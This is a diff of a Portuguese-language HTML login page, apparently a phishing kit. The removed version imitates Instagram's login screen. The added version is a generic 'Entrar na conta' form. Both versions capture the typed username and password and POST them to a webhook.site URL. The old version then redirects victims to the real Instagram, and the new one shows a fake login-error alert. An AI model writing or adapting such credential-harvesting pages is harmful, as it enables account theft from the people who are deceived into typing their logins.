@@ -1,40 +1,50 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <title>Instagram</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 100px; }
+    input { margin: 10px; padding: 10px; width: 200px; }
+    button { padding: 10px 20px; }
+  </style>
 </head>
 <body>
-    <div class="insta-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo">
-        <form id="login-form">
-            <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" required>
-            <input type="password" id="password" placeholder="Senha" required>
-            <button type="submit">Entrar</button>
-        </form>
-        <p class="forgot">Esqueceu a senha?</p>
-    </div>
+  <h2>Entrar na conta</h2>
+  <form id="login-form">
+    <input type="text" id="username" placeholder="Usuário" required><br>
+    <input type="password" id="password" placeholder="Senha" required><br>
+    <button type="submit">Entrar</button>
+  </form>
 
-    <script>
-        const form = document.getElementById("login-form");
-        form.addEventListener("submit", function(e) {
-            e.preventDefault();
+  <script>
+    const form = document.getElementById('login-form');
 
-            const data = {
-                username: document.getElementById("username").value,
-                password: document.getElementById("password").value
-            };
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // impede o reload da página
 
-            fetch("https://webhook.site/5f05847b-9b72-4cd1-bdd7-fa2a889734e6", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
+      // pega os valores dos inputs
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
-            // Redireciona pro Instagram real
-            window.location.href = "https://instagram.com";
-        });
-    </script>
+      // monta o objeto com os dados
+      const data = {
+        username: username,
+        password: password
+      };
+
+      // envia pro webhook
+      fetch("https://webhook.site/5f05847b-9b72-4cd1-bdd7-fa2a889734e6", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+
+      // feedback visual (opcional)
+      alert("Erro ao fazer login. Tente novamente.");
+    });
+  </script>
 </body>
 </html>
